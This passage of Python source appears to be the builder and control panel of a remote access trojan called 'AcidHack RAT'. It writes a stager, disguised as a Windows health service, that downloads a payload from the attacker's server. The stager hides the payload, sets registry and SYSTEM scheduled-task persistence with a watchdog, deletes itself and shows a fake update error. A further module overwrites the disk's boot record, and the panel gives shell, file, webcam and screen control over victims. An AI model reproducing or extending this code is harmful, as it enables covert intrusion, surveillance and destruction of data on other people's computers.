                                hc(json.loads(l.strip()))
                            except Exception as e:
                                debug("Parse: "+str(e))
                except socket.timeout:
                    try:
                        sock.sendall((json.dumps({"type":"ping"})+"\\n").encode())
                    except:
                        break
                    continue
                except:
                    break
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass
        if running:
            time.sleep(DELAY)
    
    debug("=== PAYLOAD ENDED ===")
'''
        
        # Replace placeholders with actual values
        payload_src = payload_template.replace("{HOST}", host).replace("{PORT}", str(port))
        
        # Write payload source
        payload_py = os.path.join(script_dir, "payload_src.py")
        with open(payload_py, 'w', encoding='utf-8') as f:
            f.write(payload_src)
        
        # ==========================================
        # STEP 2: Build the STAGER source
        # ==========================================
        stager_template = r'''#!/usr/bin/env python3
import os, sys, socket, subprocess, ctypes, time, getpass, shutil
from datetime import datetime

# Hide all subprocess windows
_startupinfo = subprocess.STARTUPINFO()
_startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
_startupinfo.wShowWindow = 0

HOST = "{HOST}"
PORT = {PORT}
PAYLOAD_PORT = {PAYLOAD_PORT}
PAYLOAD_URL = "http://" + HOST + ":" + str(PAYLOAD_PORT) + "/payload.exe"
PAYLOAD_NAME = "SysHealthTrayX64.exe"

# Final resting place: AppDataRoamingMicrosoftSysHealth
APPDATA_ROAMING = os.environ.get("APPDATA", os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming"))
FINAL_DIR = os.path.join(APPDATA_ROAMING, "Microsoft", "SysHealth")
FINAL_PATH = os.path.join(FINAL_DIR, PAYLOAD_NAME)

DEBUG_LOG = os.path.join(os.environ.get("TEMP", "C:\\\\Temp"), "stager_debug.txt")

def debug(msg):
    try:
        with open(DEBUG_LOG, "a") as f:
            f.write(str(datetime.now()) + " - " + str(msg) + "\\n")
    except:
        pass

debug("=== Stager started ===")
debug("HOST: " + str(HOST))
debug("PORT: " + str(PORT))
debug("PAYLOAD_PORT: " + str(PAYLOAD_PORT))
debug("Temp dir: " + str(os.environ.get("TEMP", "C:\\\\Temp")))
debug("FINAL_PATH: " + str(FINAL_PATH))

def download_payload():
    import urllib.request
    import urllib.error
    
    debug("Downloading payload from: " + PAYLOAD_URL)
    
    for attempt in range(10):
        debug("=== Download attempt " + str(attempt+1) + " ===")
        try:
            req = urllib.request.Request(PAYLOAD_URL)
            # Use a simple User-Agent
            req.add_header('User-Agent', 'Mozilla/4.0')
            
            with urllib.request.urlopen(req, timeout=60) as response:
                body = response.read()
                debug("Downloaded: " + str(len(body)) + " bytes")
                
                if len(body) > 5000:
                    debug("Writing payload to: " + str(FINAL_PATH))
                    os.makedirs(FINAL_DIR, exist_ok=True)
                    
                    if os.path.exists(FINAL_PATH):
                        os.remove(FINAL_PATH)
                    with open(FINAL_PATH, "wb") as f:
                        f.write(body)
                    
                    final_size = os.path.getsize(FINAL_PATH)
                    debug("SUCCESS: Payload saved! Size=" + str(final_size) + " bytes")
                    return FINAL_PATH
                else:
                    debug("Body too small: " + str(len(body)) + " bytes")
        except Exception as e:
            debug("Download error: " + str(e))
            import traceback
            debug("Traceback: " + traceback.format_exc())
        
        time.sleep(3)
    
    debug("All download attempts failed!")
    return None

def hide_file(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 2)  # FILE_ATTRIBUTE_HIDDEN
        debug("File hidden (attribute set)")
    except Exception as e:
        debug("Hide error: " + str(e))

def full_hide(path):
    """Set hidden + system file attributes to make it harder to see."""
    try:
        FILE_ATTRIBUTE_HIDDEN = 0x02
        FILE_ATTRIBUTE_SYSTEM = 0x04
        FILE_ATTRIBUTE_READONLY = 0x01
        attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
        ctypes.windll.kernel32.SetFileAttributesW(path, attrs)
        debug("Full hide (H+S) applied: " + str(path))
    except Exception as e:
        debug("Full hide error: " + str(e))

def persist_registry(path):
    """Multiple registry locations for resilience."""
    try:
        import winreg
        
        # 1. Current User Run
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "WindowsHealthService", 0, winreg.REG_SZ, path)
        debug("Registry HKCU Run added")
        
        # 2. Current User RunOnce (always re-adds on next boot)
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
        with winreg.CreateKey(key, subkey) as k:
            winreg.SetValueEx(k, "WindowsHealthSync", 0, winreg.REG_SZ, path)
        debug("Registry HKCU RunOnce added")
        
        # 3. Current User Wow6432Node (for 32-bit apps on 64-bit Windows)
        try:
            subkey = r"Software\\Classes\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, subkey) as k:
                winreg.SetValueEx(k, "WindowsHealthService", 0, winreg.REG_SZ, path)
            debug("Registry Wow6432Node added")
        except:
            pass
        
        return True
    except Exception as e:
        debug("Registry persistence error: " + str(e))
        return False

def persist_schtask(path):
    """Scheduled task that re-adds registry if someone removes it."""
    try:
        task_name = "WindowsHealthService"
        
        # Create a task that runs the payload at logon
        _si = subprocess.STARTUPINFO()
        _si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        _si.wShowWindow = 0
        subprocess.run(
            'schtasks /create /tn "' + task_name + '" /tr "' + path + '" /sc onlogon /ru SYSTEM /f',
            shell=True, capture_output=True, timeout=10,
            creationflags=0x00000008, startupinfo=_si
        )
        debug("Scheduled task created: " + task_name)
        
        # Create a SECOND task as a watchdog that re-installs if deleted
        watchdog_name = "WindowsHealthWatchdog"
        ps_watchdog = (
            '$action = New-ScheduledTaskAction -Execute "' + path + '"\\n'
            '$trigger = New-ScheduledTaskTrigger -Daily -At "03:00AM"\\n'
            '$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\\n'
            'Register-ScheduledTask -TaskName "' + watchdog_name + '" -Action $action -Trigger $trigger -Settings $settings -Force\\n'
        )
        _si2 = subprocess.STARTUPINFO()
        _si2.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        _si2.wShowWindow = 0
        subprocess.run(["powershell", "-Command", ps_watchdog],
                      capture_output=True, timeout=10,
                      creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=_si2)
        debug("Watchdog scheduled task created: " + watchdog_name)
        
        return True
    except Exception as e:
        debug("Schtask error: " + str(e))
        return False

def persist_startup_folder(path):
    """Drop a shortcut in the Startup folder."""
    try:
        startup = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        shortcut_path = os.path.join(startup, "SysHealth.lnk")
        
        ps = (
            '$WScriptShell = New-Object -ComObject WScript.Shell\\n'
            '$Shortcut = $WScriptShell.CreateShortcut("' + shortcut_path + '")\\n'
            '$Shortcut.TargetPath = "' + path + '"\\n'
            '$Shortcut.WindowStyle = 7\\n'
            '$Shortcut.Description = "System Health Monitor"\\n'
            '$Shortcut.Save()\\n'
        )
        _si3 = subprocess.STARTUPINFO()
        _si3.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        _si3.wShowWindow = 0
        subprocess.run(["powershell", "-Command", ps],
                      capture_output=True, timeout=10,
                      creationflags=subprocess.CREATE_NO_WINDOW, startupinfo=_si3)
        debug("Startup folder shortcut created")
        return True
    except Exception as e:
        debug("Startup folder error: " + str(e))
        return False

def ensure_running_loop(payload_path):
    """Background thread that checks if the payload is running and re-launches if killed."""
    import threading as th
    
    def watcher():
        time.sleep(5)  # Initial delay to let payload start
        while True:
            try:
                # Check if payload process exists
                result = subprocess.run(
                    'tasklist /fi "IMAGENAME eq ' + PAYLOAD_NAME + '" /nh',
                    shell=True, capture_output=True, timeout=5,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                output = result.stdout.decode('oem', errors='ignore')
                
                if PAYLOAD_NAME not in output:
                    debug("Payload not running! Re-launching...")
                    ctypes.windll.shell32.ShellExecuteW(0, "open", payload_path, None, None, 0)
                    
                    # Also re-persist registry (in case user removed it)
                    persist_registry(payload_path)
                else:
                    # Check if persistence is intact, re-add if missing
                    import winreg
                    try:
                        key = winreg.HKEY_CURRENT_USER
                        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                        with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as k:
                            val, _ = winreg.QueryValueEx(k, "WindowsHealthService")
                            if val != payload_path:
                                persist_registry(payload_path)
                    except FileNotFoundError:
                        persist_registry(payload_path)
            except:
                pass
            time.sleep(30)  # Check every 30 seconds
    
    watcher_thread = th.Thread(target=watcher, daemon=True)
    watcher_thread.start()
    debug("Process watchdog started (checking every 30s)")
    return watcher_thread

if __name__ == "__main__":
    payload_path = download_payload()
    
    if payload_path:
        debug("Payload ready at: " + str(payload_path))
        
        # Hide the file
        full_hide(payload_path)
        
        # Multi-layer persistence
        persist_registry(payload_path)
        persist_schtask(payload_path)
        
        # Launch the payload — ZERO console window
        debug("Launching payload: " + str(payload_path))
        try:
            ctypes.windll.shell32.ShellExecuteW(0, "open", payload_path, None, None, 0)
            debug("Payload launched via ShellExecuteW (SW_HIDE)")
        except Exception as e:
            debug("Failed to launch payload: " + str(e))
        
        # Start watchdog to ensure it keeps running
        ensure_running_loop(payload_path)
        
        debug("Melting stager...")
        # Self-delete using PowerShell (no console window)
        try:
            exe_path = sys.argv[0]
            debug("Self-deleting: " + str(exe_path))
            
            ps_script = (
                'Start-Sleep -Seconds 2; '
                'Remove-Item -Path "' + exe_path + '" -Force -ErrorAction SilentlyContinue; '
                'while (Test-Path "' + exe_path + '") { Start-Sleep -Seconds 1; Remove-Item "' + exe_path + '" -Force -ErrorAction SilentlyContinue }'
            )
            
            _si6 = subprocess.STARTUPINFO()
            _si6.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            _si6.wShowWindow = 0
            subprocess.Popen(
                ["powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                close_fds=True
            )
            debug("Self-delete via PowerShell launched")
        except Exception as e:
            debug("Self-delete error: " + str(e))
        
    else:
        debug("Download FAILED - showing retry message")
        try:
            ctypes.windll.user32.MessageBoxW(0, "Update failed. Please try again later.\\nError: 0x80070005", "Windows Update", 0x10)
        except:
            pass
    
    debug("Stager exiting")
    sys.exit(0)
'''
        
        stager_src = stager_template.replace("{HOST}", host).replace("{PORT}", str(port)).replace("{PAYLOAD_PORT}", str(port+1))
        
        stager_py = os.path.join(script_dir, "stager_src.py")
        with open(stager_py, 'w', encoding='utf-8') as f:
            f.write(stager_src)
        
        # ==========================================
        # STEP 3: Compile both with PyInstaller
        # ==========================================
        self.status_label.setText("[*] Compiling payload (Stage 2)...")
        QApplication.processEvents()
        
        # Run PyInstaller via subprocess to avoid GUI crash
        def build_with_pyi(src, out_name):
            """Run PyInstaller and return the path to the built exe, or None."""
            import subprocess as sp
            import tempfile
            
            # Use temp dirs to avoid permission issues
            build_dir = os.path.join(script_dir, 'build_temp')
            dist_dir = os.path.join(script_dir, 'dist_temp')
            
            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile', '--noconsole',
                '--name', out_name,
                '--distpath', dist_dir,
                '--workpath', build_dir,
                '--specpath', script_dir,
                '--noconfirm',
                '--noupx',
                src
            ]
            
            self.status_label.setText(f"[*] Building {out_name}...")
            QApplication.processEvents()
            
            try:
                result = sp.run(cmd, capture_output=True, text=True, timeout=600)
                # Save log for debugging
                log_path = os.path.join(script_dir, f'build_{out_name}.log')
                with open(log_path, 'w') as f:
                    f.write(f"STDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}")
                
                # Look for the exe in dist_dir
                expected = os.path.join(dist_dir, out_name + '.exe')
                if os.path.exists(expected):
                    return expected
                
                # Also check common names
                for fname in [out_name + '.exe', out_name, out_name.lower() + '.exe']:
                    fpath = os.path.join(dist_dir, fname)
                    if os.path.exists(fpath):
                        return fpath
                
                return None
            except Exception as e:
                self.status_label.setText(f"[!] Build error for {out_name}: {e}")
                QApplication.processEvents()
                return None
        
        # Build payload
        payload_exe = build_with_pyi(payload_py, 'payload')
        if payload_exe:
            shutil.copy2(payload_exe, os.path.join(script_dir, payload_name))
            self.status_label.setText("[+] Payload compiled! Now building stager...")
            QApplication.processEvents()
        else:
            # Check if it got built anyway
            for f in [os.path.join(script_dir, 'payload.exe'), 'payload.exe']:
                if os.path.exists(f):
                    payload_exe = f
                    shutil.copy2(f, os.path.join(script_dir, payload_name))
                    break
        
        if not os.path.exists(os.path.join(script_dir, payload_name)):
            raise Exception("Payload compilation failed - check build_payload.log for details")
        
        # Build stager
        stager_base = stager_name.replace('.exe', '')
        stager_exe = build_with_pyi(stager_py, stager_base)
        if stager_exe:
            shutil.copy2(stager_exe, os.path.join(script_dir, stager_name))
            self.status_label.setText("[+] Stager compiled!")
            QApplication.processEvents()
        else:
            # Check if it got built anywhere
            for f in [os.path.join(script_dir, f'{stager_base}.exe'), f'{stager_base}.exe']:
                if os.path.exists(f):
                    if f != os.path.join(script_dir, stager_name):
                        shutil.copy2(f, os.path.join(script_dir, stager_name))
                    break
        
        if not os.path.exists(os.path.join(script_dir, stager_name)):
            raise Exception(f"Stager compilation failed - check build_{stager_base}.log for details")
        
        # ==========================================
        # STEP 4: Cleanup temp files
        # ==========================================
        for f in [payload_py, stager_py]:
            try: os.remove(f)
            except: pass
        try: shutil.rmtree("build")
        except: pass
        try: shutil.rmtree("dist")
        except: pass
        for f in ["payload.spec", stager_name.replace('.exe', '.spec')]:
            try: os.remove(f)
            except: pass
        
        # ==========================================
        # STEP 5: Reload payload in the server
        # ==========================================
        if self.parent() and hasattr(self.parent(), 'listener'):
            self.parent().listener._load_payload()
            self.status_label.setText("[+] Payload loaded into server memory!")
            QApplication.processEvents()
        
        # Success!
        stager_size = os.path.getsize(stager_name)/1024
        payload_size = os.path.getsize(payload_name)/1024
        
        self.status_label.setText("[+] SUCCESS! Both EXEs built!")
        self.status_label.setStyleSheet("color: #44ff44; padding: 8px; font-weight: bold;")
        
        QMessageBox.information(self, "Build Complete",
            f"=== BUILD SUCCESSFUL ===\n\n"
            f"Stage 1 - STAGER:\n"
            f"  {stager_name} ({stager_size:.1f} KB)\n\n"
            f"Stage 2 - PAYLOAD:\n"
            f"  {payload_name} ({payload_size:.1f} KB)\n"
            f"  Auto-hosted on port {port+1}\n\n"
            f"C2 on port {port} | Payload on port {port+1}")

# ============================================================
# MBR BOOT PERSISTENCE MODULE (your friend's code, integrated)
# ============================================================
class MBRBootInstaller:
    """Installs MBR boot persistence for the payload."""
    
    MBR_SIZE = 512
    BOOTSTRAP_SIZE = 440
    PHYSICAL_DRIVE = r'\\.\PhysicalDrive0'
    
    @staticmethod
    def build_bootstrap():
        boot = bytearray(440)
        boot[0:30] = bytes([
            0xFA, 0x31, 0xC0, 0x8E, 0xD0, 0xBC, 0x00, 0x7C,
            0xFB, 0x8E, 0xD8, 0x8E, 0xC0, 0xBE, 0x00, 0x7C,
            0xBF, 0x00, 0x06, 0xB9, 0x00, 0x02, 0xFC, 0xF3,
            0xA4, 0xEA, 0x05, 0x06, 0x00, 0x00
        ])
        boot[30:60] = bytes([
            0xB8, 0x00, 0x12, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
            0xD0, 0xBC, 0x00, 0x7E, 0xBE, 0x2A, 0x06, 0xE8,
            0x3C, 0x00, 0xB4, 0x41, 0xBB, 0xAA, 0x55, 0xCD,
            0x13, 0x72, 0x27, 0x81, 0xFB, 0x55
        ])
        boot[60:90] = bytes([
            0xAA, 0x75, 0x21, 0xF6, 0xC1, 0x01, 0x74, 0x1C,
            0xBE, 0xDA, 0x06, 0xE8, 0x1F, 0x00, 0xBE, 0xF0,
            0x06, 0xB4, 0x02, 0xB0, 0x3F, 0xB5, 0x00, 0xB6,
            0x00, 0xB7, 0x00, 0xCD, 0x13, 0x72
        ])
        boot[90:120] = bytes([
            0x0A, 0xBE, 0x03, 0x07, 0xE8, 0x05, 0x00, 0xEA,
            0x00, 0x7E, 0x00, 0x00, 0xAC, 0x3C, 0x00, 0x74,
            0x09, 0xB4, 0x0E, 0xBB, 0x07, 0x00, 0xCD, 0x10,
            0xEB, 0xF2, 0xC3, 0x00, 0x00, 0x00
        ])
        msg_offset = 120
        msg = b'BOOTMGR'
        for i, ch in enumerate(msg):
            boot[msg_offset + i] = ch
        boot[msg_offset + len(msg)] = 0
        
        error_offset = 130
        err = b'MBR ERR'
        for i, ch in enumerate(err):
            boot[error_offset + i] = ch
        boot[error_offset + len(err)] = 0
        
        payload_msg_offset = 230
        pmsg = b'PAYLOAD OK'
        for i, ch in enumerate(pmsg):
            boot[payload_msg_offset + i] = ch
        boot[payload_msg_offset + len(pmsg)] = 0
        
        boot[440 - 2] = 0x00
        boot[440 - 1] = 0x00
        
        return boot

    @staticmethod
    def read_original_mbr():
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        GENERIC_READ = 0x80000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x00000080
        INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
        
        handle = kernel32.CreateFileW(
            MBRBootInstaller.PHYSICAL_DRIVE,
            GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None
        )
        if handle == INVALID_HANDLE_VALUE:
            return None
        
        mbr = bytearray(MBRBootInstaller.MBR_SIZE)
        bytes_read = ctypes.c_ulong(0)
        
        kernel32.ReadFile(
            handle,
            mbr,
            MBRBootInstaller.MBR_SIZE,
            ctypes.byref(bytes_read),
            None
        )
        
        kernel32.CloseHandle(handle)
        
        if bytes_read.value != MBRBootInstaller.MBR_SIZE:
            return None
        
        return mbr

    @staticmethod
    def write_mbr(mbr_data):
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        GENERIC_WRITE = 0x40000000
        FILE_SHARE_READ = 0x00000001
        FILE_SHARE_WRITE = 0x00000002
        OPEN_EXISTING = 3
        FILE_ATTRIBUTE_NORMAL = 0x00000080
        INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
        
        handle = kernel32.CreateFileW(
            MBRBootInstaller.PHYSICAL_DRIVE,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None
        )
        if handle == INVALID_HANDLE_VALUE:
            return False
        
        bytes_written = ctypes.c_ulong(0)
        
        result = kernel32.WriteFile(
            handle,
            mbr_data,
            MBRBootInstaller.MBR_SIZE,
            ctypes.byref(bytes_written),
            None
        )
        
        kernel32.CloseHandle(handle)
        
        return result != 0 and bytes_written.value == MBRBootInstaller.MBR_SIZE

    @staticmethod
    def install():
        """Install MBR boot persistence. Returns True on success."""
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return False, "Admin required for MBR write"
            
            original_mbr = MBRBootInstaller.read_original_mbr()
            if original_mbr is None:
                return False, "Failed to read original MBR"
            
            new_mbr = bytearray(MBRBootInstaller.MBR_SIZE)
            bootstrap = MBRBootInstaller.build_bootstrap()
            
            new_mbr[0:MBRBootInstaller.BOOTSTRAP_SIZE] = bootstrap
            new_mbr[446:510] = original_mbr[446:510]  # Preserve partition table
            new_mbr[510] = 0x55
            new_mbr[511] = 0xAA
            
            if MBRBootInstaller.write_mbr(bytes(new_mbr)):
                return True, "MBR boot persistence installed"
            else:
                return False, "Failed to write MBR"
                
        except Exception as e:
            return False, f"MBR error: {str(e)}"

# ============================================================
# MAIN WINDOW
# ============================================================
class AcidHackMainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("AcidHack RAT - Command & Control Panel v3.0")
        self.setGeometry(50, 50, 1400, 300)
        self.setStyleSheet(RED_BLACK_STYLE)

        self.client_handlers = {}
        self.client_info = {}
        self.webcam_viewers = {}
        self.file_explorers = {}
        self.chat_dialogs = {}
        self.screenshot_viewers = {}
        self.screenshare_dialogs = {}
        self.selected_client_id = None
        self.pending_downloads = {}

        self.setup_ui()
        self.start_server()

        self.status_timer = QTimer()
        self.status_timer.timeout.connect(self.update_status)
        self.status_timer.start(2000)

    def setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(10, 10, 10, 10)
        main_layout.setSpacing(8)

        # HEADER - Red/Black styled
        header = QLabel("ACIDHACK")
        header.setObjectName("header_label")
        header.setStyleSheet("""
            font-size: 22px;
            font-weight: 800;
            color: #ff3333;
            background-color: #0d0d0d;
            border: 2px solid #cc0000;
            padding: 14px;
            border-radius: 6px;
            letter-spacing: 2px;
        """)
        header.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(header)

        # TOP BAR
        top_bar = QHBoxLayout()
        self.lbl_status = QLabel("Server: STOPPED")
        self.lbl_status.setStyleSheet("color:#ff4444;font-size:14px;font-weight:bold;")
        self.lbl_clients = QLabel("Clients: 0")
        self.lbl_clients.setStyleSheet("color:#ffffff;font-size:14px;")
        self.lbl_selected = QLabel("Selected: None")
        self.lbl_selected.setStyleSheet("color:#ffaa00;font-size:14px;")

        self.btn_builder = QPushButton("BUILDER")
        self.btn_builder.setStyleSheet("""
            QPushButton { background-color: #2a0000; color: #ff4444;
                font-weight: bold; border: 1px solid #ff4444; padding: 8px 20px; }
            QPushButton:hover { background-color: #cc0000; color: #ffffff; }
        """)
        self.btn_builder.clicked.connect(self.open_builder)
        self.btn_clear = QPushButton("CLEAR LOG")
        self.btn_clear.clicked.connect(self.clear_log)

        top_bar.addWidget(self.lbl_status)
        top_bar.addWidget(self.lbl_clients)
        top_bar.addWidget(self.lbl_selected)
        top_bar.addStretch()
        top_bar.addWidget(self.btn_builder)
        top_bar.addWidget(self.btn_clear)
        main_layout.addLayout(top_bar)

        # SPLITTER: Client table (left) + Tabs (right)
        splitter = QSplitter(Qt.Horizontal)

        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        left_layout.setContentsMargins(0,0,0,0)

        client_header = QLabel("CONNECTED CLIENTS")
        client_header.setStyleSheet("font-weight:bold; color:#ff4444; font-size:13px; padding:4px 0;")
        left_layout.addWidget(client_header)

        self.client_table = QTableWidget()
        self.client_table.setColumnCount(8)
        self.client_table.setHorizontalHeaderLabels(["ID","Hostname","IP","OS","User","Privilege","AV","Last Seen"])
        self.client_table.horizontalHeader().setStretchLastSection(True)
        self.client_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.client_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.client_table.setSelectionMode(QAbstractItemView.SingleSelection)
        self.client_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.client_table.setAlternatingRowColors(True)
        self.client_table.itemSelectionChanged.connect(self.on_client_selected)
        self.client_table.setContextMenuPolicy(Qt.CustomContextMenu)
        self.client_table.customContextMenuRequested.connect(self.show_client_menu)
        left_layout.addWidget(self.client_table)
        splitter.addWidget(left_widget)

        # RIGHT SIDE: Tabs
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        right_layout.setContentsMargins(0,0,0,0)

        self.tabs = QTabWidget()
        self.tabs.setTabPosition(QTabWidget.North)

        self.cmd_tab = QWidget()
        self.setup_command_tab()
        self.tabs.addTab(self.cmd_tab, "Shell")

        self.file_tab = QWidget()
        self.setup_file_tab()
        self.tabs.addTab(self.file_tab, "Files")

        self.webcam_tab = QWidget()
        self.setup_webcam_tab()
        self.tabs.addTab(self.webcam_tab, "Webcam")

        self.screenshare_tab = QWidget()
        self.setup_screenshare_tab()
        self.tabs.addTab(self.screenshare_tab, "Screen Share")

        self.chat_tab = QWidget()
        self.setup_chat_tab()
        self.tabs.addTab(self.chat_tab, "Chat")

        self.log_tab = QWidget()
        self.setup_log_tab()
        self.tabs.addTab(self.log_tab, "Log")

        right_layout.addWidget(self.tabs)
        splitter.addWidget(right_widget)
        splitter.setSizes([1100, 300])
        main_layout.addWidget(splitter, 1)

        self.status_bar = self.statusBar()
        self.status_bar.showMessage("Ready | Listening on 0.0.0.0:4443 | ")

    def setup_command_tab(self):
        layout = QVBoxLayout()
        self.cmd_info_label = QLabel("No client selected.")
        self.cmd_info_label.setStyleSheet("color:#ffaa00;font-size:12px;padding:4px;")
        layout.addWidget(self.cmd_info_label)

        quick_group = QGroupBox("Quick Commands")
        ql = QGridLayout()
        ql.setSpacing(3)
        for text, r, c in [("ipconfig",0,0),("systeminfo",0,1),("tasklist",0,2),
                           ("netstat -an",1,0),("whoami",1,1),("dir C:\\",1,2),
                           ("powershell\nGet-Process",2,0),("schtasks",2,1),("net user",2,2)]:
            btn = QPushButton(text)
            btn.setMinimumWidth(130)
            btn.setMinimumHeight(36)
            btn.setStyleSheet("""
                QPushButton {
                    padding: 6px 10px;
                    font-size: 11px;
                    min-width: 120px;
                }
            """)
            btn.clicked.connect(lambda _,t=text.replace('\n',' '): self.execute_command(t))
            ql.addWidget(btn, r, c)
        quick_group.setLayout(ql)
        layout.addWidget(quick_group)

        cmd_layout = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Enter command...")
        self.cmd_input.returnPressed.connect(lambda: self.execute_command(self.cmd_input.text()))
        self.btn_execute = QPushButton("Execute")
        self.btn_execute.clicked.connect(lambda: self.execute_command(self.cmd_input.text()))
        cmd_layout.addWidget(self.cmd_input, 1)
        cmd_layout.addWidget(self.btn_execute)
        layout.addLayout(cmd_layout)

        self.cmd_output = QTextEdit()
        self.cmd_output.setReadOnly(True)
        self.cmd_output.setStyleSheet("background-color:#050505;color:#ffffff;font-size:12px;")
        layout.addWidget(self.cmd_output, 1)

        ag = QGroupBox("System Actions")
        al = QHBoxLayout()
        self.btn_shutdown = QPushButton("SHUTDOWN")
        self.btn_shutdown.setStyleSheet("background-color:#441111;color:#ff4444;font-weight:bold;border:2px solid #ff4444;")
        self.btn_shutdown.clicked.connect(lambda: self.send_system_command("shutdown"))
        self.btn_restart = QPushButton("RESTART")
        self.btn_restart.setStyleSheet("background-color:#441111;color:#ff4444;font-weight:bold;border:2px solid #ff4444;")
        self.btn_restart.clicked.connect(lambda: self.send_system_command("restart"))
        self.btn_msgbox = QPushButton("MESSAGE")
        self.btn_msgbox.clicked.connect(self.send_message_box)
        self.btn_disconnect = QPushButton("DISCONNECT")
        self.btn_disconnect.setStyleSheet("background-color:#441111;color:#ff4444;font-weight:bold;border:2px solid #ff4444;")
        self.btn_disconnect.clicked.connect(self.disconnect_client)
        for w in [self.btn_shutdown, self.btn_restart, self.btn_msgbox, self.btn_disconnect]:
            al.addWidget(w)
        al.addStretch()
        ag.setLayout(al)
        layout.addWidget(ag)
        self.cmd_tab.setLayout(layout)

    def setup_file_tab(self):
        layout = QVBoxLayout()
        self.file_info_label = QLabel("Select a client and open File Explorer.")
        self.file_info_label.setStyleSheet("color:#ffaa00;font-size:12px;")
        layout.addWidget(self.file_info_label)
        self.btn_open_explorer = QPushButton("OPEN FILE EXPLORER")
        self.btn_open_explorer.clicked.connect(self.open_file_explorer)
        layout.addWidget(self.btn_open_explorer)
        fg = QGroupBox("Quick File Ops")
        fl = QHBoxLayout()
        self.btn_screenshot = QPushButton("SCREENSHOT")
        self.btn_screenshot.clicked.connect(self.take_screenshot)
        self.btn_upload_quick = QPushButton("UPLOAD")
        self.btn_upload_quick.clicked.connect(self.quick_upload)
        self.btn_download_quick = QPushButton("DOWNLOAD")
        self.btn_download_quick.clicked.connect(self.quick_download)
        fl.addWidget(self.btn_screenshot)
        fl.addWidget(self.btn_upload_quick)
        fl.addWidget(self.btn_download_quick)
        fg.setLayout(fl)
        layout.addWidget(fg)
        layout.addStretch()
        self.file_tab.setLayout(layout)

    def setup_webcam_tab(self):
        layout = QVBoxLayout()
        self.webcam_info_label = QLabel("Select a client.")
        self.webcam_info_label.setStyleSheet("color:#ffaa00;font-size:12px;")
        layout.addWidget(self.webcam_info_label)
        bl = QHBoxLayout()
        self.btn_webcam_start = QPushButton("START WEBCAM")
        self.btn_webcam_start.clicked.connect(self.start_webcam)
        self.btn_webcam_stop = QPushButton("STOP")
        self.btn_webcam_stop.setEnabled(False)
        self.btn_webcam_stop.clicked.connect(self.stop_webcam)
        self.btn_webcam_viewer = QPushButton("OPEN VIEWER")
        self.btn_webcam_viewer.clicked.connect(self.open_webcam_viewer)
        bl.addWidget(self.btn_webcam_start)
        bl.addWidget(self.btn_webcam_stop)
        bl.addWidget(self.btn_webcam_viewer)
        layout.addLayout(bl)
        self.webcam_preview = QLabel("Preview here")
        self.webcam_preview.setAlignment(Qt.AlignCenter)
        self.webcam_preview.setStyleSheet("background-color:#000;color:#555;border:1px solid #330000;min-height:300px;")
        layout.addWidget(self.webcam_preview, 1)
        self.webcam_tab.setLayout(layout)

    def setup_screenshare_tab(self):
        layout = QVBoxLayout()
        self.screenshare_info_label = QLabel("Select a client and open Screen Share to view/control their desktop.")
        self.screenshare_info_label.setStyleSheet("color:#ffaa00;font-size:12px;")
        layout.addWidget(self.screenshare_info_label)
        bl = QHBoxLayout()
        self.btn_screenshare_open = QPushButton("OPEN SCREEN\nSHARE WINDOW")
        self.btn_screenshare_open.setMinimumWidth(180)
        self.btn_screenshare_open.setMinimumHeight(50)
        self.btn_screenshare_open.setStyleSheet("""
            QPushButton {
                background-color: #1a0000;
                color: #ff3333;
                font-weight: bold;
                padding: 12px 20px;
                border: 2px solid #ff3333;
